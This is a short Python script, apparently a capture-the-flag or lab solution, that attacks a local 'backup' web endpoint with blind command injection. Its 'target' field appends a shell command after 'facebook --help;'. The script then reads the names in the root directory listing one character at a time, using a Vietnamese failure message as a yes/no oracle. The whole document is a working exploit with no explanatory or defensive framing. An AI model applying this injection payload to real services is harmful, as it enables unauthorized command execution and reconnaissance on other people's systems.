import requests
chat_brup = "qwertyuiopasdfghjklzxcvbnm.,/}{()1234567890QWERTYUIOPASDFGHJKLZXCVBNM"
for index1 in range(50):
    folder = ""
    for index2 in range(50):
        for i in chat_brup:
            url = "http://localhost:3006"
            data = {
                "command" : "backup",
                "target" : f"facebook --help;ket_qua=$(ls / | head -n {index1}| tail -n 1 | cut -c{index2}) ;if [ \"$ket_qua\" = \"{i}\" ]; then echo 'zip error' ;else echo 'a';fi #"
            }
            x = requests.post(url , data=data)
            if x.text == "Backup không thành công":
                folder += i
                break
    print(folder)